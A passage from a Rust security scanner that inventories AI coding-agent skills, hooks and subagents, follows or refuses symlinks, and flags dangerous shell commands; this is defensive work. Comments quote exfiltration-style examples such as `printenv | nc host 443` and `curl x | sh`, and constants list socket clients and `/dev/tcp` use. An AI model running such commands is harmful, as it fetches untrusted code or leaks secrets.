        let within = lexical.starts_with(lexical_join(Path::new("/"), containment));
        let in_repo = repo_root.is_some_and(|r| lexical.starts_with(lexical_join(Path::new("/"), r)));
        return Some(SkillRead {
            content: None,
            symlink: Some(SkillSymlink {
                target: shown,
                escapes: !(within || in_repo),
                sensitive_target: false,
                sensitive_kind: None,
                followed: false,
                store: lexical.starts_with("/nix/store"),
                through_directory: false,
                dangling: true,
            }),
        });
    };
    // Not a regular file (a link to a directory): not a skill file.
    if !std::fs::symlink_metadata(&real).is_ok_and(|m| m.is_file()) {
        return None;
    }
    let within = real.starts_with(cache.canon_or_lexical(containment));
    let in_repo = repo_root.is_some_and(|r| real.starts_with(cache.canon_or_lexical(r)));
    let store = real.starts_with("/nix/store");
    let users_own = repo_root.is_none()
        && real.starts_with(real_home)
        && owned_by_current_user(&real)
        && user_link_target_ok(&real, real_home);
    let followed = has_skill_ext(&real) && (within || in_skill_area(&real) || in_repo || users_own || store);
    Some(SkillRead {
        content: if followed { read(&real) } else { None },
        symlink: Some(SkillSymlink {
            target: shown,
            // Inside the skill directory, or the repository / plugin root it ships in.
            escapes: !(within || in_repo),
            sensitive_target: false,
            sensitive_kind: None,
            followed,
            store,
            through_directory: false,
            dangling: false,
        }),
    })
}

/// The nearest ancestor of `path` (up to and including `root`) holding a SKILL.md entry.
fn skill_dir_of(path: &Path, root: &Path) -> Option<PathBuf> {
    let mut cur = path.parent();
    while let Some(dir) = cur {
        if std::fs::symlink_metadata(dir.join("SKILL.md")).is_ok() {
            return Some(dir.to_path_buf());
        }
        if dir == root || !dir.starts_with(root) {
            break;
        }
        cur = dir.parent();
    }
    None
}

/// Build one inventory entry, running the dynamic-context and allowed-tools analysis on
/// SKILL.md manifests and command files.
#[allow(clippy::too_many_arguments)]
fn build_skill(
    path: &Path,
    name: String,
    file_type: String,
    analyze: bool,
    read: SkillRead,
    framework: &str,
    scope: &str,
    project_root: Option<&Path>,
    ctx: &PluginContext,
) -> AgentSkill {
    let content = read.content;
    let mut dynamic_commands = Vec::new();
    let mut unrestricted_bash = false;
    if analyze && let Some(text) = content.as_deref() {
        // Claude Code runs these in the user's shell before the skill text reaches the
        // model: code.claude.com/docs/en/skills#dynamic-context-injection
        for (raw, block) in extract_dynamic_commands(text) {
            // One command: matched with its whitespace (line breaks included) collapsed, so
            // `curl x |\n  sh` (a pipe continued on the next line) is seen as the pipe it is.
            let hits = dynamic_command_hits(&raw.split_whitespace().collect::<Vec<_>>().join(" "));
            // Graded by the matched pattern's own severity: a fetch piped to a shell, an
            // exfiltration pipe or anything obfuscated (escalated to high by the matcher)
            // is dangerous; a medium-only match (`printenv NODE_ENV`, a check that
            // $OPENAI_API_KEY is set) is listed but stays advisory.
            let dangerous = hits.iter().any(|f| matches!(f.severity.as_str(), "critical" | "high"));
            // A multi-line block or inline command is shown one line per statement.
            let shown = raw.lines().map(str::trim).filter(|l| !l.is_empty()).collect::<Vec<_>>().join("; ");
            dynamic_commands.push(SkillDynamicCommand {
                command: sanitize_display(&crate::scanners::redact_command_text(&shown), 300),
                dangerous,
                patterns: hits.into_iter().map(|f| f.pattern).collect(),
                block,
            });
        }
        if let Some(fm) = frontmatter(text) {
            unrestricted_bash = grants_unrestricted_shell(&parse_allowed_tools(fm));
        }
    }
    // Frontmatter `hooks:` register when the skill, command or subagent runs
    // (code.claude.com/docs/en/hooks#hooks-in-skills-and-agents).
    let mut hooks = Vec::new();
    if (analyze || file_type == "agent")
        && let Some(text) = content.as_deref()
        && let Some(fm) = frontmatter(text)
    {
        let skill_dir = path.parent().unwrap_or(Path::new("."));
        let plugin_root = ctx.plugin_root(path);
        hooks = frontmatter_hooks(fm, path, skill_dir, plugin_root.as_deref());
    }
    let mut provenance = ctx.provenance(path);
    if scope == "project"
        && (unrestricted_bash || !dynamic_commands.is_empty() || !hooks.is_empty())
        && let Some(root) = project_root
        && crate::scanners::probe_exists(&root.join(".git"))
    {
        // Unknown (git timed out, the repository is unsafe to spawn git in, or the scan's
        // git budget is spent) records nothing rather than a guess.
        if let Some(tracked) = git_tracked_through_links(path, root) {
            let git = if tracked { "tracked" } else { "untracked" };
            provenance.get_or_insert_with(SkillProvenance::default).git = Some(git.into());
        }
    }
    // An all-default provenance (a skill outside the plugin tree) says nothing.
    if provenance.as_ref().is_some_and(|p| {
        p.marketplace.is_none() && p.plugin.is_none() && p.git.is_none() && !p.synced
    }) {
        provenance = None;
    }
    let sha256 = match (&content, &read.symlink) {
        (_, Some(l)) if !l.followed => "symlink-not-followed".to_string(),
        (Some(c), _) => {
            walk_note(|w| w.bytes_hashed += c.len() as u64);
            sha256_hex(c)
        }
        (None, _) => "unreadable".to_string(),
    };
    AgentSkill {
        name: sanitize_display(&name, 128),
        path: path.to_string_lossy().to_string(),
        framework: framework.to_string(),
        scope: scope.to_string(),
        file_type,
        size_bytes: content.as_ref().map(|c| c.len()).unwrap_or(0),
        sha256,
        capabilities: content.as_ref().map(|c| infer_capabilities(c)).unwrap_or_default(),
        symlink: read.symlink,
        dynamic_commands,
        unrestricted_bash,
        provenance,
        hooks,
    }
}

/// The `hooks:` map of a skill, command or subagent file's YAML frontmatter, parsed with
/// the settings hook model. `skill_dir` is what `${CLAUDE_SKILL_DIR}` expands to; a
/// plugin skill also expands the plugin-root placeholders.
pub fn frontmatter_hooks(fm: &str, path: &Path, skill_dir: &Path, plugin_root: Option<&Path>) -> Vec<crate::models::AgentHook> {
    use crate::scanners::hook_sources::{claude_plugin_vars, extract_hook_map, Dialect, HookCtx};
    if fm.len() > MAX_FRONTMATTER {
        return Vec::new();
    }
    let Ok(v) = serde_yaml_ng::from_str::<serde_json::Value>(fm) else { return Vec::new() };
    let Some(map) = v.get("hooks") else { return Vec::new() };
    let mut ctx = HookCtx::new(path, Dialect::Claude);
    ctx.own_dir = Some(".claude");
    ctx.vars.push(("${CLAUDE_SKILL_DIR}", skill_dir.to_path_buf()));
    if let Some(root) = plugin_root {
        ctx.root = Some(root);
        ctx.root_label = "plugin";
        ctx.vars.extend(claude_plugin_vars(root));
    }
    extract_hook_map(map, &ctx)
}

/// Whether a project skill file is committed. A file reached through a committed
/// symlinked directory (`.claude/skills/lint -> ../../shared/skills/lint`) is not itself
/// in the index; it is committed when that link is and its real path is.
fn git_tracked_through_links(path: &Path, root: &Path) -> Option<bool> {
    use crate::scanners::git_tracked_state;
    if git_tracked_state(path)? {
        return Some(true);
    }
    let link = path
        .ancestors()
        .skip(1)
        .take_while(|a| a.starts_with(root) && *a != root)
        .find(|a| std::fs::symlink_metadata(a).is_ok_and(|m| m.file_type().is_symlink()));
    let Some(link) = link else { return Some(false) };
    let Ok(real) = canonicalize(path) else { return Some(false) };
    Some(git_tracked_state(link)? && git_tracked_state(&real)?)
}

/// Recursively discover skill BUNDLES: a `SKILL.md` manifest plus the scripts shipped
/// alongside it, and `commands/*.md` files inside the tree (plugin commands).
///
/// Modern agent skills are not flat files in `commands/` — they are directories
/// (`skills/<name>/SKILL.md` + `scripts/*.sh|*.py|*.js`), and they arrive through the
/// marketplace -> plugin -> skill chain under `~/.claude/plugins/`. The flat
/// `scan_skill_dir` walk cannot see any of it: it does not recurse, so on a machine with
/// 200 installed `SKILL.md` manifests it happily reports the three (empty) directories
/// it does know about.
///
/// Bundled siblings are inventoried too, not just the manifest: the manifest routinely
/// reads clean while the payload sits in an adjacent script.
///
/// Symlinked FILES are inventoried with their link text and judged on their real path
/// (see `read_skill_file`). A symlinked skill DIRECTORY at the top of a `skills/` root
/// (`~/.claude/skills/pdf -> ~/.agents/skills/pdf`, the layout `npx skills` and GNU stow
/// create, and which Claude Code loads) is judged by [`skill_dir_link`] and then walked
/// or inventoried unread; symlinked directories deeper in a bundle are not descended.
fn scan_skill_bundles(
    root: &Path,
    framework: &str,
    scope: &str,
    project_root: Option<&Path>,
    ctx: &PluginContext,
    results: &mut Vec<AgentSkill>,
) {
    if !crate::scanners::probe_dir(root) {
        return;
    }
    let root_link = judge_walk_root(root, scope, project_root, ctx);
    note_root_link(&root_link);
    if let RootLink::Refuse(info) = root_link {
        results.push(refused_root_entry(root, info, framework, scope, project_root, ctx));
        return;
    }
    let mut cache = WalkCache::default();
    let mut budget = MAX_BUNDLE_FILES;
    let mut entries_left = MAX_BUNDLE_ENTRIES;
    let mut stack = vec![root.to_path_buf()];
    // Followed top-level directory links: (lexical link path, what to record on the
    // files found under it).
    let mut dir_links: Vec<(PathBuf, SkillSymlink)> = Vec::new();
    let skills_root = root.file_name().is_some_and(|n| n == "skills");
    while let Some(dir) = stack.pop() {
        let Ok(entries) = crate::scanners::probe_read_dir(&dir) else {
            continue;
        };
        for entry in entries.flatten() {
            if budget == 0 || entries_left == 0 {
                walk_note(|w| w.budget_exhausted = true);
                crate::scanners::telemetry::mark_truncated();
                return;
            }
            entries_left -= 1;
            walk_note(|w| w.entries += 1);
            let path = entry.path();
            // symlink_metadata: never follow a link out of the tree we were pointed at.
            let Ok(meta) = std::fs::symlink_metadata(&path) else {
                continue;
            };
            let file_name = path.file_name().and_then(|n| n.to_str()).unwrap_or("");
            if skills_root
                && dir == root
                && meta.file_type().is_symlink()
                && std::fs::metadata(&path).is_ok_and(|m| m.is_dir())
            {
                match skill_dir_link(&path, root, scope, project_root, ctx) {
                    DirLink::Follow(info) => {
                        dir_links.push((path.clone(), info));
                        stack.push(path);
                    }
                    DirLink::Refuse(info) => {
                        budget -= 1;
                        let manifest = path.join("SKILL.md");
                        let read = SkillRead { content: None, symlink: Some(info) };
                        let name = file_name.to_string();
                        results.push(build_skill(
                            &manifest, name, "skill-manifest".into(), true, read, framework, scope, project_root, ctx,
                        ));
                    }
                    DirLink::NotASkill => {}
                }
                continue;
            }
            if meta.is_dir() {
                // A git directory never holds a skill; walking it only spent budget.
                if file_name != ".git" {
                    stack.push(path);
                }
                continue;
            }
            let is_link = meta.file_type().is_symlink();
            if !meta.is_file() && !is_link {
                continue;
            }
            let ext = path.extension().and_then(|e| e.to_str()).unwrap_or("");
            // The manifest, a plugin command, or a script shipped beside them.
            let is_manifest = file_name.eq_ignore_ascii_case("SKILL.md");
            let in_commands = path
                .parent()
                .and_then(|p| p.file_name())
                .is_some_and(|n| n == "commands");
            let is_command = !is_manifest && ext.eq_ignore_ascii_case("md") && in_commands;
            if !is_manifest && !is_command && !matches!(ext, "sh" | "bash" | "py" | "js" | "ts" | "mjs") {
                continue;
            }
            budget -= 1;
            // A project's skills may link anywhere inside the repository; a plugin's
            // links are judged against the skill (or commands) directory and may be read
            // anywhere inside the plugin's own root.
            let plugin_root = ctx.plugin_root(&path);
            let containment = if let Some(proj) = project_root.filter(|_| scope == "project") {
                proj.to_path_buf()
            } else if is_command {
                path.parent().map(Path::to_path_buf).unwrap_or_else(|| root.to_path_buf())
            } else {
                cache
                    .skill_dir_of(&path, root)
                    .or_else(|| plugin_root.clone())
                    .unwrap_or_else(|| root.to_path_buf())
            };
            let repo_root = project_root.filter(|_| scope == "project").map(Path::to_path_buf).or(plugin_root);
            let Some(mut read) =
                read_skill_file(&path, is_link, &containment, repo_root.as_deref(), ctx, &mut cache)
            else {
                continue;
            };
            // A file found under a followed skill-directory link records that link (unless
            // the file is itself a link, which is judged on its own).
            if read.symlink.is_none()
                && let Some((_, info)) = dir_links.iter().find(|(l, _)| path.starts_with(l))
            {
                read.symlink = Some(info.clone());
            }
            if let RootLink::Follow(info) = &root_link {
                record_root_link(&mut read, &path, info);
            }
            // A manifest is named by its bundle directory (the unit users think in);
            // a bundled script or command is named by its path relative to the walk
            // root, which stays unambiguous when several bundles each ship a
            // `scripts/run.sh`.
            let name = if is_manifest {
                path.parent()
                    .and_then(|p| p.file_name())
                    .and_then(|n| n.to_str())
                    .unwrap_or("unknown")
                    .to_string()
            } else {
                path.strip_prefix(root)
                    .ok()
                    .and_then(|rel| rel.to_str())
                    .map(String::from)
                    .unwrap_or_else(|| file_name.to_string())
            };
            let file_type = if is_manifest {
                "skill-manifest".to_string()
            } else if is_command {
                "command".to_string()
            } else {
                ext.to_string()
            };
            results.push(build_skill(
                &path, name, file_type, is_manifest || is_command, read, framework, scope, project_root, ctx,
            ));
        }
    }
}

/// What to do with a symlinked directory at the top of a `skills/` root.
enum DirLink {
    /// Walk it; record this on every file found under it.
    Follow(SkillSymlink),
    /// Inventory `<link>/SKILL.md` with this, unread.
    Refuse(SkillSymlink),
    /// The target holds no SKILL.md: Claude Code loads nothing from it.
    NotASkill,
}

/// Judge a top-level skill-directory link on its REAL path, with the same rules as a
/// linked file (see `read_skill_file`): a credential, agent-config, system or other-user
/// directory is never walked (High); a directory that contains HOME or the skills root
/// itself is never walked; a project's link is walked only inside the repository; the
/// user's own link is walked into their own directories under HOME, into their skill
/// areas and into /nix/store. Everything else is inventoried unread (Low).
fn skill_dir_link(link: &Path, root: &Path, scope: &str, project_root: Option<&Path>, ctx: &PluginContext) -> DirLink {
    use crate::scanners::persistence::{is_sensitive_read_target, lexical_join};
    let home = ctx.home.as_path();
    let Ok(target) = std::fs::read_link(link) else { return DirLink::NotASkill };
    let Ok(real) = canonicalize(link) else { return DirLink::NotASkill };
    // Existence only: the manifest is not opened here.
    if std::fs::symlink_metadata(real.join("SKILL.md")).is_err() {
        return DirLink::NotASkill;
    }
    let shown = sanitize_display(&target.to_string_lossy(), 300);
    let ScanPaths { real_home, areas } = ctx.paths();
    let lexical = lexical_join(link.parent().unwrap_or(root), &target);
    let in_skill_area = |p: &Path| areas.iter().any(|a| p.starts_with(a));
    let repo = project_root.filter(|_| scope == "project").map(canon_or_lexical);
    let in_repo = |p: &Path| repo.as_ref().is_some_and(|r| p.starts_with(r) && !real_home.starts_with(r));
    let sensitive = (!in_skill_area(&real) && !in_repo(&real) && is_sensitive_read_target(&real, real_home))
        || (!in_skill_area(&lexical) && !in_repo(&lexical) && is_sensitive_read_target(&lexical, home));
    let kind = read_kind(&lexical, home, &real, real_home);
    let info = |escapes: bool, sensitive_target: bool, followed: bool| SkillSymlink {
        target: shown.clone(),
        escapes,
        sensitive_target,
        sensitive_kind: kind.filter(|_| sensitive_target),
        followed,
        store: real.starts_with("/nix/store"),
        through_directory: true,
        dangling: false,
    };
    if sensitive {
        return DirLink::Refuse(info(true, true, false));
    }
    // Walking HOME, or the skills root again, is never what a skill link means.
    let real_root = canon_or_lexical(root);
    if real_home.starts_with(&real) || real_root.starts_with(&real) {
        return DirLink::Refuse(info(true, false, false));
    }
    let follow = match repo {
        Some(_) => in_repo(&real),
        None => {
            in_skill_area(&real)
                || real.starts_with("/nix/store")
                || (real.starts_with(real_home) && owned_by_current_user(&real))
        }
    };
    if follow {
        // A whole skill directory linked in is self-contained at its target: inventory.
        // `escapes` means what it means for a linked file: the real path is outside the
        // skills root (and, for a project, outside the repository).
        let escapes = !(real.starts_with(&real_root) || in_repo(&real));
        DirLink::Follow(info(escapes, false, true))
    } else {
        DirLink::Refuse(info(true, false, false))
    }
}

/// Subagent directories nested below an `agents/` walk root, at most.
const MAX_AGENT_SUBDIRS: usize = 64;
/// How deep below the `agents/` walk root subagent folders are walked.
const MAX_AGENT_DEPTH: usize = 4;

/// A Claude Code subagent directory and its subfolders: "Claude Code scans
/// `.claude/agents/` and `~/.claude/agents/` recursively"
/// (code.claude.com/docs/en/sub-agents.md, fetched 2026-10-23). Subfolders are real
/// directories only (a symlinked one is not descended), dot-directories are skipped, and
/// the walk is bounded in depth and count; each folder is scanned like the root.
fn scan_agents_tree(root: &Path, scope: &str, project_root: Option<&Path>, ctx: &PluginContext, results: &mut Vec<AgentSkill>) {
    scan_skill_dir(root, "claude-code-agent", scope, project_root, ctx, results);
    if matches!(judge_walk_root(root, scope, project_root, ctx), RootLink::Refuse(_)) {
        // A refused walk root is one directory-level entry (scan_skill_dir); nothing under it.
        return;
    }
    let mut stack = vec![(root.to_path_buf(), 0usize)];
    let mut budget = MAX_AGENT_SUBDIRS;
    let mut dirs = Vec::new();
    while let Some((d, depth)) = stack.pop() {
        if depth >= MAX_AGENT_DEPTH {
            continue;
        }
        let Ok(rd) = crate::scanners::probe_read_dir(&d) else { continue };
        let mut children: Vec<PathBuf> = rd
            .flatten()
            .inspect(|_| walk_note(|w| w.entries += 1))
            .map(|e| e.path())
            .filter(|p| !p.file_name().and_then(|n| n.to_str()).is_some_and(|n| n.starts_with('.')))
            .filter(|p| std::fs::symlink_metadata(p).is_ok_and(|m| m.is_dir()))
            .collect();
        children.sort();
        for c in children {
            if budget == 0 {
                walk_note(|w| w.budget_exhausted = true);
                break;
            }
            budget -= 1;
            dirs.push(c.clone());
            stack.push((c, depth + 1));
        }
    }
    dirs.sort();
    for d in dirs {
        scan_skill_dir(&d, "claude-code-agent", scope, project_root, ctx, results);
    }
}

fn scan_skill_dir(
    dir: &Path,
    framework: &str,
    scope: &str,
    project_root: Option<&Path>,
    ctx: &PluginContext,
    results: &mut Vec<AgentSkill>,
) {
    let root_link = judge_walk_root(dir, scope, project_root, ctx);
    note_root_link(&root_link);
    if let RootLink::Refuse(info) = root_link {
        if crate::scanners::probe_dir(dir) {
            results.push(refused_root_entry(dir, info, framework, scope, project_root, ctx));
        }
        return;
    }
    let Ok(entries) = crate::scanners::probe_read_dir(dir) else {
        return;
    };
    // `commands/` holds custom slash commands, which support dynamic context too.
    let is_commands_dir = dir.file_name().is_some_and(|n| n == "commands");
    // `agents/` holds subagent definitions: markdown only.
    let is_agents_dir = framework == "claude-code-agent" || dir.file_name().is_some_and(|n| n == "agents");
    let mut cache = WalkCache::default();

    for entry in entries.flatten() {
        walk_note(|w| w.entries += 1);
        let path = entry.path();
        // symlink_metadata, not is_file(): a symlinked command is inventoried with its
        // target instead of being followed blindly.
        let meta = std::fs::symlink_metadata(&path).ok();
        let is_link = meta.as_ref().is_some_and(|m| m.file_type().is_symlink());
        let present = meta.as_ref().is_some_and(|m| m.is_file()) || is_link;
        crate::scanners::telemetry::note_probe(&path, present);
        if !present {
            continue;
        }

        let ext = path
            .extension()
            .and_then(|e| e.to_str())
            .unwrap_or("");

        // Only scan known skill file types
        if !matches!(ext, "md" | "txt" | "yaml" | "yml" | "json" | "sh" | "bash" | "py" | "js" | "ts") {
            continue;
        }
        if is_agents_dir && ext != "md" {
            continue;
        }
        // ~/.codex holds the Codex credential and state files beside its hook files:
        // auth.json (the OpenAI API key and OAuth tokens), internal_storage.json, the
        // models cache. Opening one would put its size and hash in the report. Only the
        // instruction files and scripts Codex keeps there (AGENTS.md and other markdown,
        // scripts) are read; hooks.json is the settings scanner's (hook_discovery).
        if framework == "codex" && !codex_skill_file(&path) {
            continue;
        }

        // A project's commands may link anywhere inside the repository (monorepos share
        // prompt files between .claude/commands and other agents' rule directories).
        let project = project_root.filter(|_| scope == "project");
        let containment = project.unwrap_or(dir);
        let Some(mut read) = read_skill_file(&path, is_link, containment, project, ctx, &mut cache) else {
            continue;
        };
        if let RootLink::Follow(info) = &root_link {
            record_root_link(&mut read, &path, info);
        }

        let name = path
            .file_stem()
            .and_then(|s| s.to_str())
            .unwrap_or("unknown")
            .to_string();

        results.push(build_skill(
            &path,
            name,
            if is_agents_dir { "agent".to_string() } else { ext.to_string() },
            is_commands_dir && ext == "md",
            read,
            framework,
            scope,
            project_root,
            ctx,
        ));
    }
}

/// A top-level `~/.codex` file the skills walk may open: markdown or a script; never a
/// credential name ([`is_sensitive_read_name`]) and never a JSON/YAML/text file
/// (auth.json, internal_storage.json, config files, and `hooks.json`, which the settings
/// scanner reads and grades as a hook file; review of 4e3f8c3).
///
/// [`is_sensitive_read_name`]: crate::scanners::persistence::is_sensitive_read_name
fn codex_skill_file(path: &Path) -> bool {
    if crate::scanners::persistence::is_sensitive_read_name(path) {
        return false;
    }
    let ext = path.extension().and_then(|e| e.to_str()).unwrap_or("");
    matches!(ext, "md" | "sh" | "bash" | "py" | "js" | "ts")
}

/// The YAML frontmatter text (between a leading `---` line and the next `---` line),
/// if present and at most 16 KiB.
pub fn frontmatter(text: &str) -> Option<&str> {
    let text = text.strip_prefix('\u{feff}').unwrap_or(text);
    let first_end = text.find('\n')?;
    if text[..first_end].trim_end() != "---" {
        return None;
    }
    let body = &text[first_end + 1..];
    let mut off = 0;
    for line in body.split_inclusive('\n') {
        if line.trim_end() == "---" {
            let fm = &body[..off];
            return (fm.len() <= MAX_FRONTMATTER).then_some(fm);
        }
        off += line.len();
        if off > MAX_FRONTMATTER {
            return None;
        }
    }
    None
}

/// Text after the frontmatter (the whole text when there is none).
fn body_after_frontmatter(text: &str) -> &str {
    let t = text.strip_prefix('\u{feff}').unwrap_or(text);
    let Some(first_end) = t.find('\n') else { return t };
    if t[..first_end].trim_end() != "---" {
        return t;
    }
    let body = &t[first_end + 1..];
    let mut off = 0;
    for line in body.split_inclusive('\n') {
        off += line.len();
        if line.trim_end() == "---" {
            return &body[off..];
        }
    }
    t
}

/// The dangerous-pattern hits for one dynamic-context command, with the two
/// substring-only rows of the shared rules-file matcher replaced by the shapes they are
/// named after. The GitHub contents API returns base64, so `gh api ... | base64 -d | head`
/// is the ordinary way to read a file, and `curl --data-urlencode` is a query, not an
/// encoder: "base64 decode to shell" is kept only when the decode feeds a shell or
/// interpreter, and "cross-channel: encoding + network" only when encoded output is
/// what a network client sends. Obfuscated matches are kept as they are.
///
/// A medium row (`printenv`, an `API_KEY` name) is escalated to high when the command
/// hands data to a network sender ([`feeds_network_sender`]): `printenv | nc host 443`
/// is the exfiltration the row is named after, not a lookup. Data piped to a raw socket
/// (nc, socat, telnet, `/dev/tcp`) is an exfiltration hit even when no row matched.
///
/// This is the one gate for skill dynamic commands and command-type hooks of every agent:
/// a hit of severity critical or high makes the command dangerous.
pub(crate) fn command_hits(cmd: &str) -> Vec<crate::models::RulesFileFinding> {
    let mut hits: Vec<crate::models::RulesFileFinding> = crate::scanners::rules_files::check_dangerous_patterns(cmd)
        .into_iter()
        .filter(|f| {
            if f.pattern.contains("(obfuscated") {
                return true;
            }
            if f.pattern.starts_with("base64 decode to shell") {
                return decodes_into_shell(cmd);
            }
            if f.pattern.starts_with("cross-channel: encoding + network") {
                return sends_encoded_data(cmd);
            }
            true
        })
        .collect();
    if pipes_into_socket(cmd) && !hits.iter().any(|f| f.pattern.starts_with("data exfiltration")) {
        hits.push(crate::models::RulesFileFinding {
            severity: "high".into(),
            pattern: "data exfiltration pattern (piped to a network socket)".into(),
        });
    }
    if feeds_network_sender(cmd) {
        for f in &mut hits {
            if matches!(f.severity.as_str(), "medium" | "low") {
                f.severity = "high".into();
            }
        }
    }
    hits
}

fn dynamic_command_hits(cmd: &str) -> Vec<crate::models::RulesFileFinding> {
    command_hits(cmd)
}

/// The dangerous-pattern rows that make a hook MODULE's source (a Claude Code mod, an
/// OpenCode plugin) dangerous: critical rows matched on the raw text only. A module is
/// ordinary program code, so `child_process`, `exec(` and an `API_KEY` name are what it
/// normally contains; a fetch piped to a shell, a decode into a shell, a listener or a
/// credential file sent to the network are not.
pub(crate) fn module_source_dangerous(src: &str) -> Vec<crate::models::RulesFileFinding> {
    crate::scanners::rules_files::check_dangerous_patterns(src)
        .into_iter()
        .filter(|f| f.severity == "critical" && !f.pattern.contains("(obfuscated"))
        .collect()
}

/// Calls that run their (string) arguments as a command: node's child_process, execa,
/// Bun.spawn, Deno.Command, and `system`. Claude Code mods have no Node.js APIs; their
/// process API is `$.process.run([...])` / `$.process.spawn([...])`, an argument list run
/// with no shell (code.claude.com/docs/en/plugins/mods/api.md, fetched 2026-10-23), so
/// `run` counts when it is called as `process.run`.
const MODULE_EXEC_CALLS: &[&str] = &[
    "exec", "execSync", "execFile", "execFileSync", "spawn", "spawnSync", "execa", "execaSync", "execaCommand",
    "execaCommandSync", "system", "Command",
];
/// Template tags that run the template as a shell command (Bun's and zx's `$`, execa).
const MODULE_EXEC_TAGS: &[&str] = &["$", "execa", "execaSync", "execaCommand"];

/// A JavaScript/TypeScript module split for grading, lexically (nothing is run):
/// (every string or template literal that a shell-execution call receives, at any
/// argument depth, one per line; the source with comments removed). A guard plugin that
/// names what it blocks (`cmd.includes("curl") && cmd.includes("| sh")`) has its text
/// only in the second; `` $`curl x | sh` `` and `execSync("curl x | sh")` are in both.
/// Regex literals are skipped where an operand is expected, so a quote inside one does
/// not open a string.
pub(crate) fn module_exec_strings(src: &str) -> (Vec<String>, String) {
    let b = src.as_bytes();
    let mut execs: Vec<String> = Vec::new();
    let mut code = String::with_capacity(src.len());
    // One entry per open parenthesis: whether it is a shell-execution call, and the
    // string literals it received (joined into one argv line when it closes, as an
    // exec-form hook's `args` are).
    let mut frames: Vec<(bool, Vec<String>)> = Vec::new();
    let mut ident = String::new();
    // Whitespace followed the identifier: the next identifier byte starts a new one.
    let mut ident_done = false;
    // The last significant code byte, for telling a regex literal from a division.
    let mut last_sig: u8 = b'(';
    let mut i = 0;
    while i < b.len() {
        let c = b[i];
        // Comments.
        if c == b'/' && b.get(i + 1) == Some(&b'/') {
            while i < b.len() && b[i] != b'\n' {
                i += 1;
            }
            continue;
        }
        if c == b'/' && b.get(i + 1) == Some(&b'*') {
            let end = src[i + 2..].find("*/").map_or(b.len(), |e| i + 2 + e + 2);
            code.extend(src[i..end].chars().filter(|c| *c == '\n'));
            i = end;
            continue;
        }
        // Regex literal where an operand is expected.
        if c == b'/' && matches!(last_sig, b'(' | b',' | b'=' | b':' | b'[' | b'!' | b'&' | b'|' | b'?' | b'{' | b'}' | b';' | b'\n') {
            let mut j = i + 1;
            let mut class = false;
            while j < b.len() && b[j] != b'\n' {
                match b[j] {
                    b'\\' => j += 1,
                    b'[' => class = true,
                    b']' => class = false,
                    b'/' if !class => break,
                    _ => {}
                }
                j += 1;
            }
            let end = (j + 1).min(b.len());
            code.push_str(&src[i..end]);
            i = end;
            last_sig = b'x';
            ident.clear();
            continue;
        }
        if matches!(c, b'"' | b'\'' | b'`') {
            let tagged = c == b'`' && MODULE_EXEC_TAGS.contains(&ident.as_str());
            let mut j = i + 1;
            while j < b.len() && b[j] != c && !(c != b'`' && b[j] == b'\n') {
                if b[j] == b'\\' {
                    j += 1;
                }
                j += 1;
            }
            let end = j.min(b.len());
            let body = &src[(i + 1).min(end)..end];
            if tagged || frames.iter().any(|f| f.0) {
                let lit = body.replace('\n', " ");
                if let Some(f) = frames.iter_mut().rev().find(|f| f.0) {
                    f.1.push(lit.clone());
                }
                execs.push(lit);
            }
            let close = (end + 1).min(b.len());
            code.push_str(&src[i..close]);
            i = close;
            last_sig = b'x';
            ident.clear();
            continue;
        }
        if c.is_ascii_alphanumeric() || c == b'_' || c == b'$' {
            if ident_done {
                ident.clear();
                ident_done = false;
            }
            ident.push(c as char);
        } else if c.is_ascii_whitespace() {
            ident_done = !ident.is_empty();
        } else {
            ident_done = false;
            match c {
                b'(' => {
                    let process_run = ident == "run" && src[..i].trim_end().ends_with("process.run");
                    frames.push((MODULE_EXEC_CALLS.contains(&ident.as_str()) || process_run, Vec::new()));
                }
                b')' => {
                    if let Some((true, argv)) = frames.pop()
                        && argv.len() > 1
                    {
                        execs.push(argv.join(" "));
                    }
                }
                _ => {}
            }
            ident.clear();
        }
        if !c.is_ascii_whitespace() || c == b'\n' {
            last_sig = if c.is_ascii_alphanumeric() || c == b'_' || c == b'$' { b'x' } else { c };
        }
        // Copy one whole character (the source is UTF-8).
        let w = src[i..].chars().next().map_or(1, char::len_utf8);
        code.push_str(&src[i..i + w]);
        i += w;
    }
    (execs, code)
}

/// A hook module's pattern verdict: (hits in what a shell-execution call runs, graded
/// with the command-hook gate; critical rows anywhere else in the code, comments
/// removed, as advisory pattern names).
pub(crate) fn module_source_verdict(src: &str) -> (Vec<crate::models::RulesFileFinding>, Vec<String>) {
    let (execs, code) = module_exec_strings(src);
    let mut hits: Vec<crate::models::RulesFileFinding> = Vec::new();
    for e in execs.iter().take(500) {
        for h in crate::scanners::hook_sources::command_verdict(e).0 {
            if !hits.iter().any(|x| x.pattern == h.pattern) {
                hits.push(h);
            }
        }
    }
    let advisory = module_source_dangerous(&code)
        .into_iter()
        .map(|f| f.pattern)
        .filter(|p| !hits.iter().any(|h| h.pattern == *p))
        .collect();
    (hits, advisory)
}

/// Raw network socket clients: they only ever send what they are given.
const SOCKET_CLIENTS: &[&str] = &["nc", "ncat", "netcat", "socat", "telnet"];
/// Interpreters whose one-liners can make a network request themselves.
const SCRIPT_INTERPRETERS: &[&str] = &["python", "python2", "python3", "node", "ruby", "perl", "deno", "bun", "php"];
/// What an interpreter one-liner's HTTP or socket request looks like.
const SCRIPT_NET_MARKERS: &[&str] = &[
    "urlopen", "urllib", "requests.", "http.client", "httpx", "fetch(", "https.request", "http.request", "https.get",
    "http.get", "net::http", "net/http", "socket", "open-uri", "lwp::", "axios",
];

/// Data piped (or redirected) into a raw network socket: a pipeline stage after the
/// first that runs nc, ncat, socat or telnet, or a bash `/dev/tcp` / `/dev/udp`
/// redirection.
pub fn pipes_into_socket(cmd: &str) -> bool {
    let lower = cmd.to_ascii_lowercase();
    lower.contains("/dev/tcp/")
        || lower.contains("/dev/udp/")
        || pipe_stages(&lower).iter().skip(1).any(|s| SOCKET_CLIENTS.contains(&stage_program(s).as_str()))
}

/// Local data handed to a network sender: a pipeline stage after the first whose program
/// is a network client (curl, wget, nc, ncat, socat, telnet, httpie, xh), a network
/// client whose arguments carry a command substitution (`curl https://x/$(cat key)`), a
/// `/dev/tcp` redirection, or an interpreter one-liner (python, node, ruby, perl, ...)
/// that makes an HTTP or socket request.
pub fn feeds_network_sender(cmd: &str) -> bool {
    let lower = cmd.to_ascii_lowercase();
    if pipes_into_socket(&lower) {
        return true;
    }
    let stages = pipe_stages(&lower);
    if stages.iter().skip(1).any(|s| SENDERS.contains(&stage_program(s).as_str())) {
        return true;
    }
